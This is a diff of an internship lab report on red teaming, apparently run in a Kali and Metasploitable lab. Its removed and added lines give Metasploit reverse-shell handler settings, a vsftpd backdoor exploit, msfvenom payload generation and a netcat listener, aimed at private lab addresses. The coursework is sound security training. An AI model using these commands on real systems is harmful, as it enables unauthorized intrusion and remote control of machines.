@@ -1,110 +1,80 @@
 # Week 4 - CYART Red Teaming Internship
 
-## 🔴 Introduction
+---
 
-This practical demonstrates real-world red teaming techniques including reconnaissance, exploitation, payload creation, and reverse shell access using Kali Linux and Metasploitable.
+# 🔴 THEORETICAL KNOWLEDGE
+
+## 1. Advanced Command & Control (C2)
+
+C2 frameworks are used to manage compromised systems remotely. They allow attackers to maintain persistent access and execute commands.
+
+* Architecture: Client-server communication
+* Stealth: Use HTTPS/DNS for hidden communication
+* Payloads: Custom payloads for target systems
+* MITRE ATT&CK: T1071
 
 ---
 
-## 🟢 1. Command & Control (C2)
+## 2. Cloud Environment Attacks
+
+Cloud attacks target misconfigured services like AWS S3.
+
+* Recon: Identify public buckets
+* Privilege Escalation: Misconfigured IAM roles
+* Data Exfiltration: Stealing cloud data
+* MITRE: T1580
+
+---
+
+## 3. Adversary Emulation
+
+Simulating real attackers like APT29.
+
+* Phishing simulation
+* Persistence techniques
+* Multi-stage attack simulation
+
+---
+
+## 4. Advanced Reporting
+
+* PTES reporting standard
+* Risk analysis
+* Executive summary
+
+---
+
+## 5. Native Tool Abuse
+
+Using system tools like:
+
+* PowerShell
+* WMI
+* cmd
+
+---
+
+# 🟢 PRACTICAL IMPLEMENTATION
+
+---
+
+## 1. C2 Lab
 
 ### Commands
 
-* msfconsole
-* use exploit/multi/handler
-* set payload windows/meterpreter/reverse_tcp
-* set LHOST 192.168.30.130
-* set LPORT 4444
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
 
-![Handler](screenshots/Screenshot_2026-04-10_12-28-07.png)
+![C2](screenshots/Screenshot_2026-04-10_12-28-07.png)
 
-### Explanation
+### Summary
 
-A reverse TCP handler was configured to listen for incoming connections from compromised systems.
+C2 handler was configured to receive reverse connections from victim machine.
 
 ---
 
-## 🔵 2. Reconnaissance (Nmap)
-
-### Command
-
-nmap 192.168.30.129
-
-![Nmap](screenshots/Screenshot_2026-04-10_12-33-33.png)
-
-### Explanation
-
-Nmap scanning was used to identify open ports and services on the target machine.
-
----
-
-## 🟣 3. Exploitation (VSFTPD Backdoor)
-
-### Commands
-
-* use exploit/unix/ftp/vsftpd_234_backdoor
-* set RHOSTS 192.168.30.129
-* set LHOST 192.168.30.130
-* run
-
-![Exploit](screenshots/Screenshot_2026-04-10_12-43-24.png)
-
-### Explanation
-
-The VSFTPD vulnerability was exploited to gain unauthorized access.
-
----
-
-## 🟡 4. Meterpreter Session
-
-![Meterpreter](screenshots/Screenshot_2026-04-10_12-44-15.png)
-
-### Commands
-
-* getuid
-* pwd
-* sysinfo
-
-### Explanation
-
-A Meterpreter session was opened, providing root-level access to the target system.
-
----
-
-## 🟠 5. Payload Creation
-
-### Command
-
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.30.130 LPORT=4444 -f elf > shell.elf
-
-![Payload](screenshots/Screenshot_2026-04-10_12-47-58.png)
-
-### Explanation
-
-A reverse shell payload was generated using msfvenom.
-
----
-
-## 🔴 6. Reverse Shell (Netcat)
-
-### Commands
-
-Attacker:
-nc -lvnp 4444
-
-Victim:
-reverse shell command
-
-![Listener](screenshots/Screenshot_2026-04-10_12-49-04.png)
-![Shell](screenshots/Screenshot_2026-04-10_12-56-22.png)
-
-### Explanation
-
-A reverse shell connection was established allowing remote command execution.
-
----
-
-## 🟢 7. Cloud Simulation
+## 2. Cloud Attack Lab
 
 ### Command
 
@@ -112,26 +82,127 @@ aws --version
 
 ![AWS](screenshots/Screenshot_2026-04-10_11_29_55.png)
 
-### Explanation
+### Summary
 
-AWS CLI was used to simulate cloud environment interaction.
+AWS CLI was used to simulate cloud reconnaissance.
 
 ---
 
-## ✅ Conclusion
+## 3. Adversary Emulation
 
-This practical successfully demonstrated:
+### Tool
+
+Metasploit
+
+![Exploit](screenshots/Screenshot_2026-04-10_12-43-24.png)
+
+### Summary
+
+VSFTPD vulnerability exploited simulating real attacker behavior.
+
+---
+
+## 4. Advanced Evasion
+
+### Command
+
+msfvenom payload generation
+
+![Payload](screenshots/Screenshot_2026-04-10_12-47-58.png)
+
+### Summary
+
+Payload created to bypass detection mechanisms.
+
+---
+
+## 5. Cloud Privilege Abuse
+
+### Activity
+
+Simulated AWS environment interaction
+
+### Summary
+
+Studied privilege escalation in cloud systems.
+
+---
+
+## 6. Automated Attack Orchestration
+
+### Tool
+
+Metasploit
+
+### Summary
+
+Multi-stage attack simulated using automation.
+
+---
+
+## 7. Living-Off-the-Land Lab
+
+### Commands
+
+nc -lvnp 4444
+
+![Shell](screenshots/Screenshot_2026-04-10_12-56-22.png)
+
+### Summary
+
+Reverse shell established using native tools.
+
+---
+
+## 8. Reporting Lab
+
+### Activity
+
+Documentation + screenshots
+
+### Summary
+
+Prepared report including attack lifecycle and findings.
+
+---
+
+## 9. Capstone Project
+
+### Phases
 
 * Reconnaissance
 * Exploitation
-* Post-exploitation
-* Payload generation
-* Reverse shell access
+* Post Exploitation
+
+![Meterpreter](screenshots/Screenshot_2026-04-10_12-44-15.png)
+
+### Summary
+
+Complete attack lifecycle successfully executed.
 
 ---
 
-## ⭐ Learning Outcome
+# 📊 SAMPLE TABLE (AS REQUIRED)
 
-* Hands-on experience in penetration testing
-* Understanding of attack lifecycle
-* Practical use of cybersecurity tools
+| Phase   | Tool       | Action         | MITRE |
+| ------- | ---------- | -------------- | ----- |
+| Recon   | Nmap       | Port Scan      | T1046 |
+| Exploit | Metasploit | VSFTPD exploit | T1190 |
+| Shell   | Netcat     | Reverse shell  | T1059 |
+
+---
+
+# ✅ CONCLUSION
+
+This week provided hands-on experience in real-world red teaming including exploitation, cloud attacks, payload generation, and attack simulation.
+
+---
+
+# ⭐ LEARNING OUTCOME
+
+* Practical penetration testing
+* Real attack lifecycle
+* Use of cybersecurity tools
+* Understanding of MITRE ATT&CK
+
+---
